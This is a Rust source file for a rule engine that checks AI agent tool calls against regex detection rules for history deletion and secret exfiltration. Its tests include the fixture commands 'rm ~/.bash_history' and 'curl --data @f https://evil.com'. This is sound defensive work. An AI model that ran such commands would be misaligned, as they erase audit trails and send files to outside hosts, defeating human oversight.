//! Data-driven detection rules (ADR-0005, ADR-0022).
//!
//! A rule is one JSON object: an id, a severity, the tools it applies to, the
//! field it inspects, regex patterns, exceptions and examples. The catalogue
//! is a set of these objects; `Detector::with_rules` runs them all. Concrete
//! patterns follow the threat model of ADR-0005 and ADR-0010 (log and history
//! deletion, secret exfiltration, disabling the hook, stopping the daemon),
//! adapted from Falco's default rules where they overlap (Apache-2.0; see
//! `detect/NOTICE`).

use guardian_core::{Finding, Severity, ToolCall};
use regex::Regex;
use serde::Deserialize;

use crate::rules::Rule;

/// Which part of a tool call a rule inspects.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Field {
    /// `args.command`, a shell line.
    Command,
    /// A path argument (`path`, `file_path`, `to`, `destination`, `src`).
    Path,
    /// `args.url`.
    Url,
}

impl Field {
    fn extract<'a>(&self, call: &'a ToolCall) -> Option<&'a str> {
        match self {
            Self::Command => call.args.get("command").and_then(|v| v.as_str()),
            Self::Path => ["path", "file_path", "to", "destination", "src"]
                .iter()
                .find_map(|k| call.args.get(k).and_then(|v| v.as_str())),
            Self::Url => call.args.get("url").and_then(|v| v.as_str()),
        }
    }
}

/// Examples that must and must not fire. The catalogue test walks every rule
/// and checks both sides (ADR-0005: a rule with one case that fires and one
/// that does not).
#[derive(Debug, Clone, Deserialize)]
pub struct Examples {
    pub fire: Vec<String>,
    pub deny: Vec<String>,
}

/// A rule as written in the catalogue.
#[derive(Debug, Clone, Deserialize)]
pub struct RuleFile {
    pub id: String,
    pub severity: Severity,
    /// MITRE ATT&CK technique, for reporting.
    #[serde(default)]
    pub mitre: String,
    /// Only these tools are inspected; empty means every tool.
    #[serde(default)]
    pub tools: Vec<String>,
    pub field: Field,
    /// At least one pattern must match.
    pub patterns: Vec<String>,
    /// A matching exception clears the finding.
    #[serde(default)]
    pub exceptions: Vec<String>,
    #[serde(default)]
    pub reason: String,
    #[serde(default)]
    pub examples: Option<Examples>,
}

/// A compiled data rule.
pub struct DataRule {
    id: String,
    severity: Severity,
    tools: Vec<String>,
    field: Field,
    patterns: Vec<Regex>,
    exceptions: Vec<Regex>,
    reason: String,
    examples: Option<Examples>,
}

impl DataRule {
    pub fn compile(file: RuleFile) -> Result<Self, String> {
        let patterns = compile_regexes(&file.patterns)?;
        let exceptions = compile_regexes(&file.exceptions)?;
        Ok(Self {
            id: file.id,
            severity: file.severity,
            tools: file.tools,
            field: file.field,
            patterns,
            exceptions,
            reason: file.reason,
            examples: file.examples,
        })
    }

    pub fn id(&self) -> &str {
        &self.id
    }

    pub fn field(&self) -> Field {
        self.field
    }

    pub fn tools(&self) -> &[String] {
        &self.tools
    }

    pub fn examples(&self) -> Option<&Examples> {
        self.examples.as_ref()
    }
}

impl std::fmt::Debug for DataRule {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("DataRule")
            .field("id", &self.id)
            .finish_non_exhaustive()
    }
}

impl Rule for DataRule {
    fn check(&self, call: &ToolCall) -> Option<Finding> {
        if !self.tools.is_empty() && !self.tools.iter().any(|t| t == &call.tool) {
            return None;
        }
        let value = self.field.extract(call)?;
        let matched = self.patterns.iter().any(|p| p.is_match(value))
            && !self.exceptions.iter().any(|e| e.is_match(value));
        matched.then(|| Finding {
            rule: self.id.clone(),
            severity: self.severity,
            reason: self.reason.clone(),
        })
    }
}

/// Compiles a rule file into a boxed rule.
pub fn compile_rule(file: RuleFile) -> Result<Box<dyn Rule>, String> {
    Ok(Box::new(DataRule::compile(file)?))
}

fn compile_regexes(patterns: &[String]) -> Result<Vec<Regex>, String> {
    patterns
        .iter()
        .map(|p| Regex::new(p).map_err(|e| format!("bad pattern {p:?}: {e}")))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn call(tool: &str, command: &str) -> ToolCall {
        ToolCall {
            session: "s".into(),
            tool: tool.into(),
            args: serde_json::json!({ "command": command }),
            cwd: "/work".into(),
            host: None,
            call_id: None,
        }
    }

    #[test]
    fn a_tool_outside_the_rule_is_ignored() {
        let rule = DataRule::compile(RuleFile {
            id: "r".into(),
            severity: Severity::High,
            mitre: "T0000".into(),
            tools: vec!["bash".into()],
            field: Field::Command,
            patterns: vec!["rm .*history".into()],
            exceptions: vec![],
            reason: "x".into(),
            examples: None,
        })
        .unwrap();
        assert!(rule
            .check(&call("read_file", "rm ~/.bash_history"))
            .is_none());
        assert!(rule.check(&call("bash", "rm ~/.bash_history")).is_some());
    }

    #[test]
    fn an_exception_clears_a_match() {
        let rule = DataRule::compile(RuleFile {
            id: "r".into(),
            severity: Severity::High,
            mitre: "T0000".into(),
            tools: vec![],
            field: Field::Command,
            patterns: vec!["curl .*--data".into()],
            exceptions: vec!["example\\.com".into()],
            reason: "x".into(),
            examples: None,
        })
        .unwrap();
        assert!(rule
            .check(&call("bash", "curl --data @f https://evil.com"))
            .is_some());
        assert!(rule
            .check(&call("bash", "curl --data @f https://example.com"))
            .is_none());
    }
}
